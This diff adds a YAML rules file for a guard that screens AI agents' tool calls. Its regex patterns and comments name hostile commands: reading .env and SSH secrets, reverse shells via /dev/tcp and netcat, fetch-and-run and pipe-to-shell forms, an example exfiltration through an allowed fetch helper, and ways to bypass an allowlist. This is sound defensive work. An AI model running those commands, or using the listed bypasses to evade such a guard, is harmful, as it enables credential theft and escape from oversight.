@@ -1,0 +1,166 @@
+# routerguard rules. Copy to rules.yaml (gitignored) and edit, or point LLM_GUARD_RULES at a file.
+# Hot-reloads on mtime (checked every 30 s). A rules file that fails to parse is ignored and
+# the previous good rules stay in force.
+#
+# Every tool call the router hands back is matched against these rules, whichever upstream
+# produced it. Patterns are Python regexes (case-insensitive, multiline) matched against the
+# tool name plus every decoded string argument, so \u-escapes and newlines cannot hide a match.
+#   block  -> the call never reaches the agent (rewritten to a harmless echo, or stripped)
+#   flag   -> the call goes through; a ledger row records it
+#
+# Design rule: block only what no legitimate unattended agent task needs. Anything an agent
+# might plausibly do on purpose (curl, pip, launchctl) is a flag, not a block.
+
+# ---- secrets to mask outbound ------------------------------------------------------------
+# KEY=value files. Every VALUE (12+ chars, not a URL) is replaced by <<REDACTED:KEY>> in the
+# outbound messages, and a tool call that carries a value is blocked (rule secret-value-in-args).
+# Missing files are skipped silently. LLM_GUARD_SECRET_FILES=a:b:c appends more at runtime.
+secret_files: []
+#  - ~/.env
+#  - ~/work/my-app/.env
+#  - ~/work/my-app/.env.local
+
+# ---- knobs --------------------------------------------------------------------------------
+keepalive_seconds: 10        # while tool-call chunks are buffered, emit an empty delta this often
+on_block: rewrite            # rewrite: blocked call becomes `echo '[guard] Blocked ...'` (agent loop continues)
+                             # strip:   blocked call is removed and the turn ends with a note in the content
+fail_mode: closed            # what a bug in the guard itself does to a reply: closed drops that reply's tool
+                             #   calls (and fails the request if masking failed); open passes everything through
+rewrite_tool: bash           # the tool a rewritten call is addressed to (must be offered in the request's `tools`,
+rewrite_arg: command         #   else the guard falls back to strip) and the argument key it takes the command in
+# rewrite_template: '{"command": ["bash", "-lc", "echo ''{message}''"], "timeout_ms": 5000}'
+#                            # when the tool's arguments are not {command: "<string>"}: a JSON value whose
+#                            # strings may contain {message}. Codex's `shell` tool needs the array form above.
+mask_placeholder: "<<REDACTED:{name}>>"
+# ledger_db: ~/.local/share/routerguard/ledger.db    # default: <repo>/guard-ledger.db, or LLM_GUARD_DB
+# session_headers: [x-session-id, x-opencode-session] # request headers that name the agent session
+
+rules:
+  # ---- block: secret material and its containers -------------------------------
+  - id: secret-file
+    action: block
+    pattern: '(^|[\s"''=:(/])(\.env(\.(local|production|prod|dev|development|staging|secret|secrets|keys?))?|\.envrc|\.netrc|\.npmrc|\.pypirc|\.git-credentials)(?=$|[\s"''):;&|>])'
+  - id: secret-dir
+    action: block
+    pattern: '(~|/Users/[^/\s]+|/home/[^/\s]+|\$HOME)/(\.ssh|\.aws|\.gnupg|\.kube|\.docker|\.config/gh|\.config/gcloud|\.local/share/opencode/auth\.json)'
+  - id: secret-dir-relative
+    action: block
+    pattern: '(^|[\s"''=:(])\.(ssh|aws|gnupg|kube)/'
+  - id: key-files
+    action: block
+    pattern: '\b(id_rsa|id_ed25519|id_ecdsa|\w*tokens?\.json|credentials\.json|service[-_]account\w*\.json|\.pem|\.p12|\.pfx)\b'
+  - id: keychain
+    action: block
+    pattern: '\bsecurity\s+(find-(generic|internet)-password|dump-keychain|export)\b'
+  - id: secret-value-in-args
+    action: block
+    pattern: '__SECRET_VALUE__'          # special: matched against the secret list, not this regex
+  - id: redacted-placeholder-exfil
+    action: block
+    pattern: '<<REDACTED:'                # a placeholder is being pushed into a command
+  - id: dotfile-glob
+    action: block
+    # glob, bracket, brace or quote spellings of a dotfile name: `cat *.env`, `cat .e?v`, `cat .[e]nv`,
+    # `cat .{e,e}nv`, `cat .e"n"v`, `cat .env*`. Regex arguments like `'a.*b'` or `.{0,40}` do not
+    # match: the glob has to sit at the start of a token and be followed by letters.
+    pattern: '(^|[\s"''=(/])\.[a-z?]{0,2}\?[a-z]\b|(^|[\s"''=(/])\.[a-z]{0,2}(\[[a-z]+\]|\{[a-z,]+\}|["''][a-z]+["''])[a-z]*|(^|[\s"''=(/])\.[a-z]{1,2}\*(?=$|[\s"'';&|)])|\*\.(env|envrc|netrc|npmrc|pypirc)\b|(^|[\s"''=:(/])\.env[?*\[]'
+  - id: find-exec
+    action: block
+    # only when -exec hands the file to a shell/interpreter or deletes; `-exec grep/ls/cat {}` stays allowed
+    pattern: '\bfind\b[^|\n]*\s-(exec|execdir|ok|okdir)\s+(sudo\s+)?(sh|bash|zsh|dash|python\d*|perl|ruby|node|php|env|xargs|rm|chmod|curl|wget)\b'
+  - id: rg-pre
+    action: block
+    pattern: '\brg\b[^|\n]*\s--pre\b'
+  - id: git-no-index
+    action: block
+    pattern: '\bgit\s+diff\b[^|\n]*--no-index'
+
+  # ---- block: classic injection shapes -----------------------------------------
+  - id: pipe-to-shell
+    action: block
+    pattern: '\|\s*(sudo\s+)?(ba|z|da|k)?sh\b(\s|$|-)'
+  - id: pipe-to-interpreter
+    action: block
+    # fetched content EXECUTED by an interpreter (stdin script). `curl x | python3 -c "..."`
+    # is data parsing with the code visible in the command, and stays allowed.
+    pattern: '\b(curl|wget)\b[^|\n]*\|\s*(sudo\s+)?(python\d*|perl|ruby|node|php)(\s+-)?\s*(;|&|\||$)'
+  - id: fetch-exec
+    action: block
+    # fetched content executed without a pipe: `bash <(curl ...)`, `sh -c "$(curl ...)"`, `eval "$(wget ...)"`,
+    # `python3 -c "$(curl ...)"`. `diff <(curl a) <(curl b)` stays allowed.
+    pattern: '\b((ba|z|da|k)?sh|source)\s+(-[a-z]+\s+)*<\(\s*(curl|wget)\b|(^|[\s;&|(])\.\s+<\(\s*(curl|wget)\b|\b((ba|z|da|k)?sh|eval|source|python\d*|perl|ruby|node|php)\b[^|\n]*\$\(\s*(curl|wget)\b'
+  - id: base64-decode
+    action: block
+    pattern: '\bbase64\s+(-d|-D|--decode)\b'
+  - id: reverse-shell
+    action: block
+    # bash-to-socket, data piped INTO netcat, netcat -e, socat exec, mkfifo+nc. Plain `nc -zv host port` stays allowed.
+    pattern: '/dev/tcp/|\|\s*(nc|ncat|netcat)\b|\b(nc|ncat|netcat)\b[^|\n]*\s-e\s*/|\bsocat\b[^|\n]*\b(exec|tcp)|\bmkfifo\b[^|\n]*\b(nc|ncat)\b'
+  - id: env-to-network
+    action: block
+    pattern: '\b(env|printenv)\b[^|\n]*\|\s*(curl|wget|nc|ncat)\b'
+  - id: shell-rc-write
+    action: block
+    pattern: '>{1,2}\s*["'']?[^\s"'']*\.(zshrc|zshenv|zprofile|bashrc|bash_profile|profile)\b'
+  - id: sudo
+    action: block
+    pattern: '(^|[\s;&|(])sudo\s'
+
+  # ---- flag: worth a ledger row, not a block -----------------------------------
+  - id: upload
+    action: flag
+    pattern: '\b(curl|wget)\b[^\n]*\s(-d|--data\S*|-F|--form|-T|--upload-file)\s'
+  - id: package-install
+    action: flag
+    pattern: '\b(pip3?|uv)\s+(install|add)\b|\b(npm|pnpm|yarn|bun)\s+(i|install|add)\b|\bbrew\s+install\b'
+  - id: launchd-cron
+    action: flag
+    pattern: '\blaunchctl\s+(load|bootstrap|submit|kickstart)\b|\bcrontab\b'
+  - id: eval-or-obfuscation
+    action: flag
+    pattern: '\beval\b|\\x[0-9a-f]{2}\\x[0-9a-f]{2}|\$''\\x'
+  - id: osascript
+    action: flag
+    pattern: '\bosascript\b'
+  - id: transform-pipe
+    action: flag
+    # output re-encoded before it goes anywhere. The masker knows base64 and hex spellings of
+    # each secret; it does not know rev/gzip/openssl output, so these get a row.
+    pattern: '\|\s+(base64|rev|od|xxd|hexdump|gzip|xz|bzip2|zstd|zip|openssl|gpg)\b'
+  - id: fetch-then-run
+    action: block
+    # download to a file and execute that same file in the next statement: `curl -o /tmp/a ...; bash /tmp/a`,
+    # `wget -O x.py ...; python3 x.py`. `curl -o data.json ... && python3 parse.py` is not this and stays allowed.
+    pattern: '\b(curl|wget)\b[^\n]*\s(-o|--output)\s*["'']?([^\s"'']+)["'']?[^\n]*(;|&&)\s*(\b((ba|z|da|k)?sh|python\d*|node|perl|ruby|php|source)\s+["'']?|\bchmod\s+\+x\s+["'']?|\./|)\3(?=$|[\s"'';&|)])'
+
+  # ---- examples: machine-specific rules (uncomment and adapt) -------------------
+  # Anything on your allowlist that takes arbitrary text and runs or sends it is a bypass of
+  # the allowlist. The author's machine has a few; yours will have different ones.
+  #
+  # A node shim that spawns whatever follows as a child process (a one-line allowlist bypass):
+  # - id: local-shim
+  #   action: block
+  #   pattern: 'spawn-shim\.mjs'
+  #
+  # Scripts that restore or back up the secret store itself:
+  # - id: keys-scripts
+  #   action: block
+  #   pattern: '\bsecrets-(restore|backup)\b'
+  #
+  # A helper that queues a prompt for a later unattended agent run (a pre-positioned stager
+  # by construction). Flag the queueing form, allow `queue-task --list`:
+  # - id: queue-task
+  #   action: flag
+  #   pattern: '(^|[\s/])queue-task\s+["''][^-]'
+  #
+  # A helper that hands a task to another model with filesystem access:
+  # - id: handoff-task
+  #   action: block
+  #   pattern: '\bhandoff-task\b'
+  #
+  # Allowlisted fetch helpers that accept attacker-controlled text (exfil path built from
+  # allowed commands: `fetch-page "https://x/?k=$(grep KEY .env)"`). The secret-value and
+  # placeholder rules above already catch the payload; flag the helper too if you want a row:
+  # - id: fetch-helpers
+  #   action: flag
+  #   pattern: '\b(fetch-page|pull-site|page-shot)\s+["'']?https?://'
